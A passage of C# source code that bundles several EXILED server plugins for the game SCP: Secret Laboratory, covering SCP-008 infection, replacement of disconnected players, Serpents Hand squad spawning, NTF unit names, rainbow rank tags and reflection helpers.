			if (ev.Attacker.characterClassManager.CurClass == RoleType.Scp0492 && Plugin.GetTeam(ev.Player.characterClassManager.CurClass) != Team.SCP && Plugin.GetTeam(ev.Player.characterClassManager.CurClass) != Team.TUT)
			{
				plugin.Functions.InfectPlayer(ev.Player);
			}
		}
		public void OnPlayerDie(ref PlayerDeathEvent ev)
		{
			if (ev.Killer.characterClassManager.CurClass == RoleType.Scp049 && Plugin.GetTeam(ev.Player.characterClassManager.CurClass) != Team.SCP && Plugin.GetTeam(ev.Player.characterClassManager.CurClass) != Team.TUT)
			{
				Vector3 pos = ev.Killer.transform.position;
				ev.Player.characterClassManager.SetClassID(RoleType.Scp0492);
				ev.Player.playerMovementSync.OverridePosition(pos, 0f);
				return;
			}
			if (sdo)
			{
				ReferenceHub plr = ev.Player;
				Timing.CallDelayed(0.5f, () =>
				{
					plr.characterClassManager.SetClassID(RoleType.ClassD);
					plr.ClearInventory();
					plr.AddItem(ItemType.Coin);
					plr.AddItem(ItemType.Flashlight);
					plr.AddItem(ItemType.KeycardJanitor);
				});
			}
		}
		public void OnPlayerJoin(PlayerJoinEvent ev)
		{
			if (sdo)
			{
				Timing.CallDelayed(3f, () =>
				{
					ev.Player.characterClassManager.SetClassID(RoleType.ClassD);
				});
			}
		}
		public void OnUseMedicalItem(MedicalItemEvent ev)
		{
			if (!plugin.InfectedPlayers.Contains(ev.Player))
				return;

			if (ev.Item == ItemType.Medkit || ev.Item == ItemType.SCP500)
				plugin.Functions.CurePlayer(ev.Player);
		}
	}
}
namespace MultiPlugin2
{
	public class Methods
	{
		private readonly Plugin plugin;
		public Methods(Plugin plugin) => this.plugin = plugin;

		public void InfectPlayer(ReferenceHub player)
		{
			if (plugin.InfectedPlayers.Contains(player))
			{
				return;
			}

			if (player.characterClassManager.IsAnyScp())
			{
				return;
			}
			plugin.InfectedPlayers.Add(player);
			plugin.Coroutines.Add(Timing.RunCoroutine(DoInfectionTimer(player), $"{player.characterClassManager.UserId}"));
		}

		private IEnumerator<float> DoInfectionTimer(ReferenceHub player)
		{
			Broadcast broadcast = (Broadcast)((Component)player).GetComponent<Broadcast>();
			for (int i = 0; (double)i < (double)Configs.InfectionLength; ++i)
			{
				if (!this.plugin.InfectedPlayers.Contains(player))
				{
					yield break;
				}
				else
				{
					player.ClearBroadcasts();
					player.GetComponent<Broadcast>().TargetAddElement(player.scp079PlayerScript.connectionToClient, string.Format(Configs.sii, (object)(float)((double)Configs.InfectionLength - (double)i)), 1, 0);
					//broadcast.RpcAddElement(string.Format("Вы заражены SCP-008. Вы станете SCP 049-2 через {0} секунд!", (object)(float)((double)this.plugin.InfectionLength - (double)i)), 1U, false);
					yield return Timing.WaitForSeconds(1f);
				}
			}

			GameObject gameObject = player.gameObject;
			Vector3 pos = gameObject.transform.position;

			Timing.RunCoroutine(TurnIntoZombie(player, pos));

			yield return Timing.WaitForSeconds(0.6f);

			foreach (ReferenceHub hub in EXILED.Plugin.GetHubs())
				if (Vector3.Distance(hub.gameObject.transform.position, player.gameObject.transform.position) < 10f && hub.characterClassManager.IsHuman() && hub != player)
					InfectPlayer(hub);
			CurePlayer(player);
		}

		public IEnumerator<float> TurnIntoZombie(ReferenceHub player, Vector3 position)
		{
			CurePlayer(player);
			if (player.characterClassManager.CurClass == RoleType.Scp0492)
			{
				yield break;
			}
			yield return Timing.WaitForSeconds(0.3f);
			CurePlayer(player);
			player.characterClassManager.SetClassIDAdv(RoleType.Scp0492, false);
			yield return Timing.WaitForSeconds(0.5f);
			CurePlayer(player);
			player.playerStats.Health = player.playerStats.maxHP;
			player.playerMovementSync.OverridePosition(position, player.gameObject.transform.rotation.y);
			CurePlayer(player);
		}

		public void CurePlayer(ReferenceHub player)
		{
			if (plugin.InfectedPlayers.Contains(player))
				plugin.InfectedPlayers.Remove(player);

			Timing.KillCoroutines($"{player.characterClassManager.UserId}");
		}
	}
}
namespace MultiPlugin2
{
	public class Plugin : EXILED.Plugin
	{
		public Methods Functions { get; private set; }
		public EventHandlers EventHandlers { get; private set; }
		public Commands Commands { get; private set; }

		internal bool Enabled;

		public List<ReferenceHub> InfectedPlayers = new List<ReferenceHub>();
		public List<CoroutineHandle> Coroutines = new List<CoroutineHandle>();
		public System.Random Gen = new System.Random();

		public override void OnEnable()
		{
			ReloadConfig();
			if (!Enabled)
				return;

			EventHandlers = new EventHandlers(this);
			Functions = new Methods(this);
			Commands = new Commands(this);

			Events.WaitingForPlayersEvent += EventHandlers.OnWaitingForPlayers;
			Events.RoundEndEvent += EventHandlers.OnRoundEnd;
			Events.PlayerHurtEvent += EventHandlers.OnPlayerHurt;
			Events.PlayerJoinEvent += EventHandlers.OnPlayerJoin;
			Events.UseMedicalItemEvent += EventHandlers.OnUseMedicalItem;
			Events.RemoteAdminCommandEvent += Commands.OnRaCommand;
			Events.RoundStartEvent += EventHandlers.OnRoundStart;
			Events.PlayerDeathEvent += EventHandlers.OnPlayerDie;
		}

		public override void OnDisable()
		{
			Events.WaitingForPlayersEvent -= EventHandlers.OnWaitingForPlayers;
			Events.PlayerHurtEvent -= EventHandlers.OnPlayerHurt;
			Events.PlayerJoinEvent -= EventHandlers.OnPlayerJoin;
			Events.UseMedicalItemEvent -= EventHandlers.OnUseMedicalItem;
			Events.RoundEndEvent -= EventHandlers.OnRoundEnd;
			Events.RemoteAdminCommandEvent -= Commands.OnRaCommand;
			Events.RoundStartEvent -= EventHandlers.OnRoundStart;
			Events.PlayerDeathEvent -= EventHandlers.OnPlayerDie;

			EventHandlers = null;
			Functions = null;
			Commands = null;
		}

		public override void OnReload()
		{
		}

		public override string getName { get; } = "Multi Plugin";

		public void ReloadConfig()
		{
			Enabled = Config.GetBool("mp_enabled", true);
		}
	}
}
namespace MultiPlugin3
{
	internal static class Configs
	{
		internal static bool disabled = false;

		internal static int linesCount = 0;

		internal static char[] lines = new char[0];

		internal static void Reload()
		{
			disabled = Plugin.Config.GetBool($"{Plugin.pluginPrefix}_enable", true);
			if (!disabled)
			{
				return;
			}
			linesCount = Plugin.Config.GetInt($"{Plugin.pluginPrefix}_linescount", 0);
			lines = new char[linesCount];
			for (int i = 0; i < linesCount; i++)
			{
				lines[i] = Plugin.Config.GetChar($"{Plugin.pluginPrefix}_line_{i + 1}");
			}
		}
	}
}
namespace MultiPlugin3
{
	public class Plugin : EXILED.Plugin
	{
		public EventHandlers EventHandlers;

		public override string getName { get; } = "Multi Plugin";

		internal const string pluginVersion = "6.6";

		internal const string pluginPrefix = "mp";

		public override void OnEnable()
		{
			try
			{
				Configs.Reload();
				if (Configs.disabled)
				{
					return;
				}
				Log.Debug("Initializing event handlers..");
				EventHandlers = new EventHandlers(this);
				Events.WaitingForPlayersEvent += EventHandlers.WaitingForPlayers;
			}
			catch (Exception e)
			{
				Log.Error($"There was an error loading the plugin: {e}");
			}
		}

		public override void OnDisable()
		{
			Events.WaitingForPlayersEvent -= EventHandlers.WaitingForPlayers;
			EventHandlers = null;
		}

		public override void OnReload()
		{
		}
	}
}
namespace MultiPlugin3
{
	public class EventHandlers
	{
		public Plugin plugin;

		public EventHandlers(Plugin plugin) => this.plugin = plugin;
		public static int one = 1;
		public static int two = 2;
		public static int two3 = 3;
		public static int two4 = 4;
		public static int two5 = 5;
		public static int two6 = 6;
		public static int two7 = 7;
		public static int two8 = 8;
		public void WaitingForPlayers()
		{
			Configs.Reload();
			if (Configs.disabled)
			{
				return;
			}
			NineTailedFoxUnits ntfUnits = PlayerManager.localPlayer.GetComponent<NineTailedFoxUnits>();
			foreach (var message in Configs.lines)
			{
				ntfUnits.NewName(out one, out Configs.lines[1]);
				ntfUnits.NewName(out two, out Configs.lines[2]);
				ntfUnits.NewName(out two3, out Configs.lines[3]);
				ntfUnits.NewName(out two4, out Configs.lines[4]);
				ntfUnits.NewName(out two5, out Configs.lines[5]);
				ntfUnits.NewName(out two6, out Configs.lines[6]);
				ntfUnits.NewName(out two7, out Configs.lines[7]);
				ntfUnits.NewName(out two8, out Configs.lines[8]);
			}
		}
	}
}
namespace MultiPlugin4
{
	public class Plugin : EXILED.Plugin
	{
		private EventHandlers ev;
		public static string repbc;
		public static ushort repbct;

		public override void OnEnable()
		{
			ev = new EventHandlers();

			Events.PlayerLeaveEvent += ev.OnPlayerLeave;
			Events.Scp106ContainEvent += ev.OnContain106;
			Events.RoundStartEvent += ev.OnRoundStart;
			repbc = Config.GetString("mp_replace_bc", "<i>You have replaced a player who has disconnected.</i>");
			repbct = Config.GetUShort("mp_replace_bc_time", 5);
		}

		public override void OnDisable()
		{
			ev = null;
		}

		public override void OnReload() { }

		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin4
{
	class EventHandlers
	{
		private bool isContain106;

		private ReferenceHub TryGet035()
		{
			return Scp035Data.GetScp035();
		}
		private ReferenceHub TryGet343()
		{
			return scp682Data.GetScp682();
		}
		private ReferenceHub TryGet682()
		{
			return scp682Data.GetScp343();
		}
		private List<int> TryGetSH()
		{
			return MultiPlugin5.API.SerpentsHand.GetSHPlayers();
		}

		private Dictionary<ReferenceHub, bool> TryGetSpies()
		{
			return SpyData.GetSpies();
		}

		private void TrySpawnSpy(ReferenceHub player, ReferenceHub dc, Dictionary<ReferenceHub, bool> spies)
		{
			SpyData.MakeSpy(player, spies[dc], false);
		}

		private void TrySpawnSH(ReferenceHub player)
		{
			MultiPlugin5.API.SerpentsHand.SpawnPlayer(player, false);
		}

		private void TrySpawn035(ReferenceHub player)
		{
			Scp035Data.Spawn035(player);
		}
		public void OnRoundStart()
		{
			isContain106 = false;
		}

		public void OnContain106(Scp106ContainEvent ev)
		{
			isContain106 = true;
		}

		public void OnPlayerLeave(PlayerLeaveEvent ev)
		{
			if (ev.Player.GetTeam() != Team.RIP)
			{
				bool is035 = false;
				bool isSH = false;
				Dictionary<ReferenceHub, bool> spies = null;
				try
				{
					is035 = ev.Player.queryProcessor.PlayerId == TryGet035()?.queryProcessor.PlayerId;
				}
				catch (Exception x)
				{
					Log.Debug("SCP-035 is not installed, skipping method call...");
				}

				try
				{
					isSH = TryGetSH().Contains(ev.Player.queryProcessor.PlayerId);
				}
				catch (Exception x)
				{
					Log.Debug("Serpents Hand is not installed, skipping method call...");
				}

				try
				{
					spies = TryGetSpies();
				}
				catch (Exception x)
				{
					Log.Debug("CISpy is not installed, skipping method call...");
				}
				if (ev.Player.queryProcessor.PlayerId == TryGet682()?.queryProcessor.PlayerId) return;
				if (ev.Player.queryProcessor.PlayerId == TryGet343()?.queryProcessor.PlayerId) return;
				Inventory.SyncListItemInfo items = ev.Player.inventory.items;
				RoleType role = ev.Player.GetRole();
				Vector3 pos = ev.Player.transform.position;
				int health = (int)ev.Player.playerStats.Health;
				float ammo = ev.Player.inventory.GetItemInHand().durability;

				ReferenceHub player = Player.GetHubs().FirstOrDefault(x => x.GetRole() == RoleType.Spectator && x.characterClassManager.UserId != string.Empty && !x.GetOverwatch());
				if (player != null)
				{
					if (isSH)
					{
						try
						{
							TrySpawnSH(player);
						}
						catch (Exception x)
						{
							Log.Debug("Serpents Hand is not installed, skipping method call...");
						}
					}
					else player.SetRole(role);
					if (spies != null && spies.ContainsKey(ev.Player))
					{
						try
						{
							TrySpawnSpy(player, ev.Player, spies);
						}
						catch (Exception x)
						{
							Log.Debug("CISpy is not installed, skipping method call...");
						}
					}
					if (is035)
					{
						try
						{
							TrySpawn035(player);
						}
						catch (Exception x)
						{
							Log.Debug("SCP-035 is not installed, skipping method call...");
						}
					}
					if (isContain106 && ev.Player.GetRole() == RoleType.Scp106) return;
					Timing.CallDelayed(0.3f, () =>
					{
						player.SetPosition(pos);
						player.inventory.items.ToList().Clear();
						foreach (var item in items) player.inventory.AddNewItem(item.id);
						player.playerStats.Health = health;
						player.inventory.items.ModifyDuration(
						player.inventory.items.IndexOf(player.inventory.GetItemInHand()),
						ammo);
						player.Broadcast(Plugin.repbct, Plugin.repbc, false);
					});
				}
			}
		}
	}
}
namespace MultiPlugin5
{
	public partial class EventHandlers
	{
		public static List<int> shPlayers = new List<int>();
		private List<int> shPocketPlayers = new List<int>();

		private bool isRoundStarted = false;

		private int respawnCount = 0;

		private static System.Random rand = new System.Random();

		private PlayerStats.HitInfo noDamage = new PlayerStats.HitInfo(0, "WORLD", DamageTypes.Nuke, 0);

		private static Vector3 shSpawnPos = new Vector3(0, 1001, 8);

		public void OnWaitingForPlayers()
		{
			Configs.ReloadConfigs();
		}

		public void OnRoundStart()
		{
			shPlayers.Clear();
			shPocketPlayers.Clear();
			isRoundStarted = true;
			respawnCount = 0;
		}

		public void OnRoundEnd()
		{
			isRoundStarted = false;
		}
		public void scpzeroninesixe(ref Scp096EnrageEvent ev)
		{
			if (shPlayers.Contains(ev.Player.queryProcessor.PlayerId))
			{
				ev.Allow = false;
			}
		}
		public void OnTeamRespawn(ref TeamRespawnEvent ev)
		{
			if (ev.IsChaos)
			{
				if (rand.Next(1, 101) <= Configs.spawnChance && Player.GetHubs().Count() > 0 && respawnCount >= Configs.respawnDelay)
				{
					List<ReferenceHub> SHPlayers = new List<ReferenceHub>();
					List<ReferenceHub> CIPlayers = new List<ReferenceHub>(ev.ToRespawn);
					ev.ToRespawn.Clear();

					for (int i = 0; i < Configs.maxSquad && CIPlayers.Count > 0; i++)
					{
						ReferenceHub player = CIPlayers[rand.Next(CIPlayers.Count)];
						SHPlayers.Add(player);
						CIPlayers.Remove(player);
					}
					Timing.CallDelayed(0.1f, () => SpawnSquad(SHPlayers));
				}
				else
				{
					string ann = Configs.ciEntryAnnouncement;
					if (ann != string.Empty)
					{
						Cassie.CassieMessage(ann, true, true);
					}
				}
			}
			respawnCount++;
		}

		public void OnPocketDimensionEnter(PocketDimEnterEvent ev)
		{
			if (shPlayers.Contains(ev.Player.queryProcessor.PlayerId))
			{
				shPocketPlayers.Add(ev.Player.queryProcessor.PlayerId);
			}
		}

		public void OnPocketDimensionDie(PocketDimDeathEvent ev)
		{
			if (shPlayers.Contains(ev.Player.queryProcessor.PlayerId))
			{
				if (!Configs.friendlyFire)
				{
					ev.Allow = false;
				}
				if (Configs.teleportTo106)
				{
					TeleportTo106(ev.Player);
				}
				shPocketPlayers.Remove(ev.Player.queryProcessor.PlayerId);
			}
		}

		public void OnPocketDimensionExit(PocketDimEscapedEvent ev)
		{
			if (shPlayers.Contains(ev.Player.queryProcessor.PlayerId))
			{
				ev.Allow = false;
				if (Configs.teleportTo106)
				{
					TeleportTo106(ev.Player);
				}
				shPocketPlayers.Remove(ev.Player.queryProcessor.PlayerId);
			}
		}

		private ReferenceHub TryGet035()
		{
			return Scp035Data.GetScp035();
		}

		public void OnPlayerHurt(ref PlayerHurtEvent ev)
		{
			if (ev.Attacker.queryProcessor.PlayerId == 0 || !isRoundStarted) return;

			ReferenceHub scp035 = null;

			try
			{
				scp035 = TryGet035();
			}
			catch (Exception x)
			{
				Log.Warn("SCP-035 not installed, ignoring API call.");
			}

			if (((shPlayers.Contains(ev.Player.queryProcessor.PlayerId) && (ev.Attacker.GetTeam() == Team.SCP || ev.Info.GetDamageType() == DamageTypes.Pocket)) ||
				(shPlayers.Contains(ev.Attacker.queryProcessor.PlayerId) && (ev.Player.GetTeam() == Team.SCP || (scp035 != null && ev.Attacker.queryProcessor.PlayerId == scp035.queryProcessor.PlayerId))) ||
				(shPlayers.Contains(ev.Player.queryProcessor.PlayerId) && shPlayers.Contains(ev.Attacker.queryProcessor.PlayerId) &&
				ev.Player.queryProcessor.PlayerId != ev.Attacker.queryProcessor.PlayerId)) && !Configs.friendlyFire)
			{
				ev.Amount = 0f;
			}
		}

		public void OnPlayerDie(ref PlayerDeathEvent ev)
		{
			if (shPlayers.Contains(ev.Player.queryProcessor.PlayerId))
			{
				shPlayers.Remove(ev.Player.queryProcessor.PlayerId);
			}

			if (ev.Player.characterClassManager.CurClass == RoleType.Scp106 && !Configs.friendlyFire)
			{
				foreach (ReferenceHub player in Player.GetHubs().Where(x => shPocketPlayers.Contains(x.queryProcessor.PlayerId)))
				{
					player.playerStats.HurtPlayer(new PlayerStats.HitInfo(50000, "WORLD", ev.Info.GetDamageType(), player.queryProcessor.PlayerId), player.gameObject);
				}
			}
		}

		public void OnCheckRoundEnd(ref CheckRoundEndEvent ev)
		{
			ReferenceHub scp035 = null;

			try
			{
				scp035 = TryGet035();
			}
			catch (Exception x)
			{
				Log.Debug("SCP-035 not installed, ignoring API call.");
			}

			bool MTFAlive = CountRoles(Team.MTF) > 0;
			bool CiAlive = CountRoles(Team.CHI) > 0;
			bool ScpAlive = CountRoles(Team.SCP) + (scp035 != null && scp035.characterClassManager.CurClass != RoleType.Spectator ? 1 : 0) > 0;
			bool DClassAlive = CountRoles(Team.CDP) > 0;
			bool ScientistsAlive = CountRoles(Team.RSC) > 0;
			bool SHAlive = shPlayers.Count > 0;

			if (SHAlive && ((CiAlive && !Configs.scpsWinWithChaos) || DClassAlive || MTFAlive || ScientistsAlive))
			{
				ev.Allow = false;
			}
			else if (SHAlive && ScpAlive && !MTFAlive && !DClassAlive && !ScientistsAlive)
			{
				if (!Configs.scpsWinWithChaos)
				{
					if (!CiAlive)
					{
						ev.LeadingTeam = RoundSummary.LeadingTeam.Anomalies;
						ev.Allow = true;
						ev.ForceEnd = true;
					}
				}
				else
				{
					ev.LeadingTeam = RoundSummary.LeadingTeam.Anomalies;
					ev.Allow = true;
					ev.ForceEnd = true;
				}
			}
		}

		public void OnSetRole(SetClassEvent ev)
		{
			if (shPlayers.Contains(ev.Player.queryProcessor.PlayerId))
			{
				if (ev.Player.GetTeam() != Team.TUT)
				{
					shPlayers.Remove(ev.Player.queryProcessor.PlayerId);
				}
			}
		}

		public void OnDisconnect(PlayerLeaveEvent ev)
		{
			Timing.CallDelayed(1f, () =>
			{
				int[] curPlayers = Player.GetHubs().Select(x => x.queryProcessor.PlayerId).ToArray();
				shPlayers.RemoveAll(x => !curPlayers.Contains(x));
			});
		}

		public void OnContain106(Scp106ContainEvent ev)
		{
			if (shPlayers.Contains(ev.Player.queryProcessor.PlayerId) && !Configs.friendlyFire)
			{
				ev.Allow = false;
			}
		}

		public void OnRACommand(ref RACommandEvent ev)
		{
			string cmd = ev.Command.ToLower();
			if (cmd.StartsWith("sh") && !cmd.StartsWith("spawnshsquad"))
			{
				ev.Allow = false;

				string[] args = cmd.Replace("spawnsh", "").Trim().Split(' ');

				if (args.Length > 0)
				{
					ReferenceHub cPlayer = Player.GetPlayer(args[0]);
					if (cPlayer != null)
					{
						SpawnPlayer(cPlayer);
						ev.Sender.RAMessage($"{cPlayer.nicknameSync.Network_myNickSync} заспавнен за длань.", true);
						return;
					}
					else
					{
						ev.Sender.RAMessage("Игрок не найден.", true);
						return;
					}
				}
				else
				{
					ev.Sender.RAMessage("SH [ник/ID]", true);
				}
			}
			else if (cmd.StartsWith("shsquad"))
			{
				ev.Allow = false;

				string[] args = cmd.Replace("spawnshsquad", "").Trim().Split(' ');

				if (args.Length > 0)
				{
					if (int.TryParse(args[0], out int a))
					{
						CreateSquad(a);
					}
					else
					{
						ev.Sender.RAMessage("Ошибка: неккоректный размер.", true);
						return;
					}
				}
				else
				{
					CreateSquad(5);
				}
				Cassie.CassieMessage(Configs.entryAnnouncement, true, true);
				ev.Sender.RAMessage("Успешно.", true);
			}
		}

		public void OnGeneratorInsert(ref GeneratorInsertTabletEvent ev)
		{
			if (shPlayers.Contains(ev.Player.queryProcessor.PlayerId) && !Configs.friendlyFire)
			{
				ev.Allow = false;
			}
		}

		public void OnFemurEnter(FemurEnterEvent ev)
		{
			if (shPlayers.Contains(ev.Player.queryProcessor.PlayerId) && !Configs.friendlyFire)
			{
				ev.Allow = false;
			}
		}
	}
}
namespace MultiPlugin5
{
	internal static class Configs
	{
		internal static List<int> spawnItems;

		internal static int spawnChance;
		internal static int health;
		internal static int maxSquad;
		internal static int respawnDelay;

		internal static string entryAnnouncement;
		internal static string ciEntryAnnouncement;

		internal static bool friendlyFire;
		internal static bool teleportTo106;
		internal static bool scpsWinWithChaos;
		internal static string spawnbc;
		internal static ushort spawnbct;

		internal static void ReloadConfigs()
		{
			spawnItems = Plugin.Config.GetIntList("mp_sh_spawn_items");
			if (spawnItems == null || spawnItems.Count == 0)
			{
				spawnItems = new List<int>() { 21, 26, 12, 14, 10 };
			}

			spawnChance = Plugin.Config.GetInt("mp_sh_spawn_chance", 50);
			health = Plugin.Config.GetInt("mp_sh_health", 150);
			maxSquad = Plugin.Config.GetInt("mp_sh_max_squad", 20);
			respawnDelay = Plugin.Config.GetInt("mp_sh_team_respawn_delay", 1);

			entryAnnouncement = Plugin.Config.GetString("mp_sh_entry_announcement", "SERPENTS HAND HASENTERED");
			ciEntryAnnouncement = Plugin.Config.GetString("mp_sh_ci_entry_announcement", "SERPENTS HAND CHAOS");

			friendlyFire = Plugin.Config.GetBool("mp_sh_friendly_fire", false);
			teleportTo106 = Plugin.Config.GetBool("mp_sh_teleport_to_106", true);
			scpsWinWithChaos = Plugin.Config.GetBool("mp_sh_scps_win_with_chaos", true);
			spawnbc = Plugin.Config.GetString("mp_sh_spawn_bc", "<color=red>You</color> <color=#15ff00>SerpentsHand</color>\n<color=#00ffdc>Your task is to kill everyone except SCP</color>");
			spawnbct = Plugin.Config.GetUShort("mp_sh_spawn_bc_time", 10);
		}
	}
}
namespace MultiPlugin5
{
	partial class EventHandlers
	{
		internal static void SpawnPlayer(ReferenceHub player, bool full = true)
		{
			shPlayers.Add(player.queryProcessor.PlayerId);
			player.characterClassManager.SetClassID(RoleType.Tutorial);
			if (full)
			{
				player.GetComponent<Broadcast>().TargetAddElement(player.scp079PlayerScript.connectionToClient, Configs.spawnbc, Configs.spawnbct, 0);
				player.inventory.items.ToList().Clear();
				for (int i = 0; i < Configs.spawnItems.Count; i++)
				{
					player.inventory.AddNewItem((ItemType)Configs.spawnItems[i]);
				}
				player.playerStats.Health = Configs.health;
			}

			Timing.CallDelayed(0.3f, () => player.playerMovementSync.OverridePosition(shSpawnPos, 0f));
		}

		internal static void CreateSquad(int size)
		{
			List<ReferenceHub> spec = new List<ReferenceHub>();
			List<ReferenceHub> pList = Player.GetHubs().ToList();

			foreach (ReferenceHub player in pList)
			{
				if (player.GetTeam() == Team.RIP)
				{
					spec.Add(player);
				}
			}

			int spawnCount = 1;
			while (spec.Count > 0 && spawnCount <= size)
			{
				int index = rand.Next(0, spec.Count);
				if (spec[index] != null)
				{
					SpawnPlayer(spec[index]);
					spec.RemoveAt(index);
					spawnCount++;
				}
			}
		}

		internal static void SpawnSquad(List<ReferenceHub> players)
		{
			foreach (ReferenceHub player in players)
			{
				SpawnPlayer(player);
			}

			Cassie.CassieMessage(Configs.entryAnnouncement, true, true);
		}

		private int CountRoles(Team team)
		{
			ReferenceHub scp035 = null;

			try
			{
				scp035 = Scp035Data.GetScp035();
			}
			catch (Exception x)
			{
				Log.Warn("SCP-035 not installed, ignoring API call.");
			}

			int count = 0;
			foreach (ReferenceHub pl in Player.GetHubs())
			{
				if (pl.GetTeam() == team)
				{
					if (scp035 != null && pl.queryProcessor.PlayerId == scp035.queryProcessor.PlayerId) continue;
					count++;
				}
			}
			return count;
		}

		private void TeleportTo106(ReferenceHub player)
		{
			ReferenceHub scp106 = Player.GetHubs().Where(x => x.characterClassManager.CurClass == RoleType.Scp106).FirstOrDefault();
			if (scp106 != null)
			{
				player.playerMovementSync.OverridePosition(scp106.transform.position, 0f);
			}
		}
	}
}
namespace MultiPlugin5
{
	public class Plugin : EXILED.Plugin
	{
		public EventHandlers EventHandlers;

		public override void OnEnable()
		{
			EventHandlers = new EventHandlers();

			Events.RoundStartEvent += EventHandlers.OnRoundStart;
			Events.RoundEndEvent += EventHandlers.OnRoundEnd;
			Events.TeamRespawnEvent += EventHandlers.OnTeamRespawn;
			Events.PocketDimEnterEvent += EventHandlers.OnPocketDimensionEnter;
			Events.PocketDimDeathEvent += EventHandlers.OnPocketDimensionDie;
			Events.PocketDimEscapedEvent += EventHandlers.OnPocketDimensionExit;
			Events.PlayerDeathEvent += EventHandlers.OnPlayerDie;
			Events.PlayerHurtEvent += EventHandlers.OnPlayerHurt;
			Events.CheckRoundEndEvent += EventHandlers.OnCheckRoundEnd;
			Events.WaitingForPlayersEvent += EventHandlers.OnWaitingForPlayers;
			Events.SetClassEvent += EventHandlers.OnSetRole;
			Events.PlayerLeaveEvent += EventHandlers.OnDisconnect;
			Events.Scp106ContainEvent += EventHandlers.OnContain106;
			Events.RemoteAdminCommandEvent += EventHandlers.OnRACommand;
			Events.GeneratorInsertedEvent += EventHandlers.OnGeneratorInsert;
			Events.FemurEnterEvent += EventHandlers.OnFemurEnter;
			Events.Scp096EnrageEvent += EventHandlers.scpzeroninesixe;
		}

		public override void OnDisable()
		{
			Events.RoundStartEvent -= EventHandlers.OnRoundStart;
			Events.RoundEndEvent -= EventHandlers.OnRoundEnd;
			Events.TeamRespawnEvent -= EventHandlers.OnTeamRespawn;
			Events.PocketDimEnterEvent -= EventHandlers.OnPocketDimensionEnter;
			Events.PocketDimDeathEvent -= EventHandlers.OnPocketDimensionDie;
			Events.PocketDimEscapedEvent -= EventHandlers.OnPocketDimensionExit;
			Events.PlayerDeathEvent -= EventHandlers.OnPlayerDie;
			Events.PlayerHurtEvent -= EventHandlers.OnPlayerHurt;
			Events.CheckRoundEndEvent -= EventHandlers.OnCheckRoundEnd;
			Events.WaitingForPlayersEvent -= EventHandlers.OnWaitingForPlayers;
			Events.SetClassEvent -= EventHandlers.OnSetRole;
			Events.PlayerLeaveEvent -= EventHandlers.OnDisconnect;
			Events.Scp106ContainEvent -= EventHandlers.OnContain106;
			Events.RemoteAdminCommandEvent -= EventHandlers.OnRACommand;
			Events.GeneratorInsertedEvent -= EventHandlers.OnGeneratorInsert;
			Events.Scp096EnrageEvent -= EventHandlers.scpzeroninesixe;

			EventHandlers = null;
		}

		public override void OnReload() { }

		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin6
{
	public class RainbowTagMod : EXILED.Plugin
	{
		public static RainbowTagMod Instance;

		public const string kCfgPrefix = "mp_";

		public static string[] ActiveRoles;

		public static void AddRainbowController(ReferenceHub player)
		{
			var component = player.GetComponent<RainbowTagController>();

			if (component != null) return;
			player.gameObject.AddComponent<RainbowTagController>();
		}


		public override void OnEnable()
		{
			if (!Config.GetBool(kCfgPrefix + "enable", true))
				return;

			ActiveRoles = Config.GetStringList(kCfgPrefix + "activegroups").ToArray();

			RainbowTagController.interval = Config.GetFloat(kCfgPrefix + "taginterval", 0.5f);

			if (Config.GetBool(kCfgPrefix + "usecustomsequence"))
				RainbowTagController.Colors = Config.GetStringList(kCfgPrefix + "colorsequence").ToArray();

			Events.PlayerJoinEvent += OnPlayerJoinEvent;

			foreach (var player in PlayerManager.players)
			{
				ReferenceHub hub = player.GetPlayer();

				if (!hub.IsRainbowTagUser())
					continue;

				AddRainbowController(hub);
			}
		}




		private void OnPlayerJoinEvent(PlayerJoinEvent ev)
		{
			if (!ev.Player.IsRainbowTagUser())
				return;


			AddRainbowController(ev.Player);
		}

		public override void OnDisable()
		{
			foreach (var player in PlayerManager.players)
			{
				UnityEngine.Object.Destroy(player.GetComponent<RainbowTagController>());
			}

			Events.PlayerJoinEvent -= OnPlayerJoinEvent;
		}



		public override void OnReload()
		{
			OnDisable();
		}

		public override string getName { get; } = "Multi Plugin";
	}
}
namespace MultiPlugin6
{
	public class RainbowTagController : MonoBehaviour
	{
		private ServerRoles _roles;
		private string _originalColor;

		private int _position = 0;
		private float _nextCycle = 0f;

		public static string[] Colors =
		{
			"pink",
			"red",
			"brown",
			"silver",
			"light_green",
			"crimson",
			"cyan",
			"aqua",
			"deep_pink",
			"tomato",
			"yellow",
			"magenta",
			"blue_green",
			"orange",
			"lime",
			"green",
			"emerald",
			"carmine",
			"nickel",
			"mint",
			"army_green",
			"pumpkin"
		};

		public static float interval { get; set; } = 0.5f;


		private void Start()
		{
			_roles = GetComponent<ServerRoles>();
			_nextCycle = Time.time;
			_originalColor = _roles.NetworkMyColor;
		}


		private void OnDisable()
		{
			_roles.NetworkMyColor = _originalColor;
		}


		private void Update()
		{
			if (Time.time < _nextCycle) return;
			_nextCycle += interval;

			_roles.NetworkMyColor = Colors[_position];

			if (++_position >= Colors.Length)
				_position = 0;
		}
	}
}
namespace MultiPlugin6
{
	public static class Extensions
	{
		public static string GetGroupName(this UserGroup group)
			=> ServerStatic.GetPermissionsHandler().GetAllGroups().Where(p => p.Value == group).Select(p => p.Key)
				.FirstOrDefault();

		public static bool IsRainbowTagUser(this ReferenceHub hub)
		{
			string group = ServerStatic.GetPermissionsHandler().GetUserGroup(hub.characterClassManager.UserId)
				.GetGroupName();

			return !string.IsNullOrEmpty(group) && RainbowTagMod.ActiveRoles.Contains(group);
		}
	}
}
namespace MultiPlugin7
{
	public static class ReflectionHelpers
	{
		private const BindingFlags flags = BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic
										   | BindingFlags.Static | BindingFlags.InvokeMethod;

		//Invokables
		internal static object GetInstanceField(Type type, object instance, string fieldName)
		{
			FieldInfo field = type.GetField(fieldName, flags);
			return field?.GetValue(instance);
		}

		internal static void SetInstanceField(Type type, object instance, string fieldName, object value)
		{
			FieldInfo field = type.GetField(fieldName, flags);
			field?.SetValue(instance, value);
		}

		internal static void InvokeInstanceMethod(Type type, object instance, string methodName, object[] param)
		{
			MethodInfo info = type.GetMethod(methodName, flags);
			info?.Invoke(instance, param);
		}


		//Instance Extensions
		public static object GetInstanceField(this object obj, string fieldName)
		{
			FieldInfo field = obj.GetType().GetField(fieldName, flags);
			return field?.GetValue(obj);
		}
		public static void SetInstanceField(this object obj, string fieldName, object value)
		{
			FieldInfo field = obj.GetType().GetField(fieldName, flags);
